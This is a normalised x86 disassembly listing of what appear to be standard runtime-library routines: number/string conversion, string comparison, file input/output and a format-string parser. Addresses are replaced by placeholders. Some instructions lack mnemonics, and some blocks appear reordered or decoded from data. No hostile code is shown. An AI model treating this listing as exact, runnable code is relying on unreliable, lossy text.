je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_445373
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x1a ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
fidiv [ eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ebp + ecx - 0x1b ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ebp + ecx - 0x1b ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_445444
push ebp
mov ebp esp
sub esp 0x6
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
fwait
fnstcw [ ebp - 0x6 ]
fwait
fnclex
fldcw [ r-xdata ]
fldz
call sub_4454ef
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4454fa
neg edx
mov ecx esi
call sub_4454fa
xor edx edx
mov al [ esi ]
cmp al [ rw-data ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
call sub_4454ef
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_445516
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
call sub_449ff0
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x6 ]
fwait
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
sub_4454fa
xor eax eax
xor edx edx
dec esi
retn
fimul [ r-xdata ]
mov [ ebp - 0x4 ] eax
fiadd [ ebp - 0x4 ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_445516
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_446058
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4460b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44e378
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
call sub_44c7a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4460bf
lea eax [ ebp - 0x10 ]
call sub_44cae0
retn
sub_4460c4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44ba5c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_44bd90
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_4460ec
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx 0xc
mov eax [ ebp - 0x4 ]
call sub_44ba74
call [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_446130
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax 0xc
call sub_44ba5c
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_4460ec
pop ecx
pop ecx
pop ebp
retn
sub_446180
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44cd60
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_44d04c
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
mov al [ eax ]
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x61
jb r-xdata
mov eax [ ebp - 0x18 ]
mov dl [ ebp - 0x9 ]
mov [ eax ] dl
inc [ ebp - 0x14 ]
inc [ ebp - 0x18 ]
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x7a
ja r-xdata
sub [ ebp - 0x9 ] 0x20
sub_4461ec
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
shr ecx 0x1
shr ecx 0x1
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
inc eax
sub_44620c
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_446260
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_44620c
test eax eax
jne r-xdata
sub_446284
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44cd60
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_44cf24
mov edx eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
call sub_44cbc8
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
call CharLowerBuffA
sub_4462cc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_44cd60
push eax
mov eax [ ebp - 0x8 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x4 ]
call sub_44cd60
push eax
mov eax [ ebp - 0x4 ]
call sub_44cf24
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_446318
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_44cd60
push eax
mov eax [ ebp - 0x8 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x4 ]
call sub_44cd60
push eax
mov eax [ ebp - 0x4 ]
call sub_44cf24
push eax
push 0x1
push 0x400
call CompareStringA
cmp eax 0x2
sete [ ebp - 0x9 ]
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_446364
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_44639c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_44cd60
test eax eax
je r-xdata
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cd60
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov [ ebp - 0x5 ] 0x1
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
add al 0xf9
sub al 0x1a
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov al [ eax + edx - 0x1 ]
add al 0xd0
sub al 0xa
jb r-xdata
sub al 0x4
je r-xdata
add al 0xfe
sub al 0x1a
jae r-xdata
sub_446418
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_446fd4
mov esp ebp
pop ebp
retn
sub_446450
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44bdb0
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_446058
sub_446490
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44bdb0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
sub_4464c0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
push 0x80
push 0x3
push 0x0
mov eax [ ebp - 0x8 ]
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x8 ]
and eax 0x3
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44cf24
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_446510
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax [ ebp - 0x4 ]
call sub_44cf24
push eax
call CreateFileA
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_446544
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ReadFile
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0xffffffff
sub_44657c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call WriteFile
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0xffffffff
sub_4465b4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SetFilePointer
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_4465f4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44cd60
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax - 0x1 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_448490
cmp al 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
dec [ ebp - 0x8 ]
jmp r-xdata
sub_44663c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_44cd60
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_44cf24
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
cmp [ edx + eax - 0x1 ] 0x0
je r-xdata
dec [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x0
jg r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov dl [ edx + eax - 0x1 ]
mov eax [ ebp - 0x10 ]
call sub_446964
test eax eax
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_448490
cmp al 0x2
jne r-xdata
dec [ ebp - 0xc ]
sub_4466ac
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_44663c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x4 ]
call sub_44cf68
mov esp ebp
pop ebp
retn
sub_4466f0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_44663c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
call sub_44cae0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ edx + eax - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44cf68
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_446747
inc [ ebx ]
add [ eax ] al
add [ esi ] ch
pop esp
cmp al [ eax ]
push ebp
mov ebp esp
add esp 0xffffffdc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
call GetDiskFreeSpaceA
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
imul [ ebp - 0xc ]
xor edx edx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_44a2c4
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x14 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_44a2c4
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x10
sub_4467fc
push esi
push edi
mov esi edx
mov edi eax
mov edx ecx
cmp edi esi
ja r-xdata
lea esi [ esi + ecx - 0x1 ]
lea edi [ edi + ecx - 0x1 ]
and ecx 0x3
std
[ edi ] [ esi ]
sub esi 0x3
sub edi 0x3
mov ecx edx
shr ecx 0x2
[ edi ] [ esi ]
cld
je r-xdata
pop edi
pop esi
retn
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_446838
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_446860
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_446894
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_44cd60
push eax
mov eax [ ebp - 0x8 ]
call sub_44cf24
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_446860
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_4468c8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_44cf24
mov edx eax
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_446860
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_4468f8
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_44691c
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_446964
push edi
push eax
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
pop edi
mov al dl
[ edi ]
mov eax 0x0
jne r-xdata
pop edi
retn
mov eax edi
dec eax
sub_446984
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_4469d8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
add [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x4 ]
call sub_44ba5c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
add [ ebp - 0x8 ] 0x4
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_446a04
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
sub [ ebp - 0xc ] 0x4
mov eax [ ebp - 0xc ]
mov eax [ eax ]
sub eax 0x4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_446a2c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4467d0
inc eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4469d8
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4467fc
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_446a6c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
sub [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov eax [ ebp - 0x4 ]
call sub_44ba74
sub_446a90
push ebp
mov ebp esp
add esp 0xffffffcc
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x1f
jbe r-xdata
mov edx [ ebp - 0xc ]
dec edx
mov eax [ ebp - 0x8 ]
call sub_4484c4
cmp al 0x1
jne r-xdata
mov [ ebp - 0xc ] 0x1f
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4467fc
mov eax [ ebp - 0xc ]
mov [ ebp + eax - 0x2c ] 0x0
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0x6
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax * 4 + rw-data ]
xor ecx ecx
call sub_446058
mov esp ebp
pop ebp
retn
dec [ ebp - 0xc ]
sub_446b28
push ebp
mov ebp esp
add esp 0xffffff8c
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] edi
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov eax edi
sub eax [ ebp - 0x4 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_446f05
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x14 ] ebx
call sub_446c0a
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x1c ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0x8 ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] esi
push ecx
push edx
call sub_446c53
pop edx
mov ebx [ ebp - 0x1c ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x15 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_446c0a
mov [ ebp - 0x15 ] al
cmp al 0x2d
jne r-xdata
xchg ebx ecx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ebx ecx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x24 ]
jmp r-xdata
push edx
lea eax [ ebp - 0xc ]
call sub_446b14
pop edx
or edx edx
je r-xdata
sub_446c0a
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
ja r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0x8 ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_446f05
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_446c53
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0x8 ]
cmp ebx [ ebp + 0x8 ]
ja r-xdata
call sub_446f05
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x24 ]
sub ecx edx
call sub_446a90
inc [ ebp - 0x8 ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx ebx [ esi + 0x4 ]
jmp [ ebx * 4 + jump_table_446c7a ]
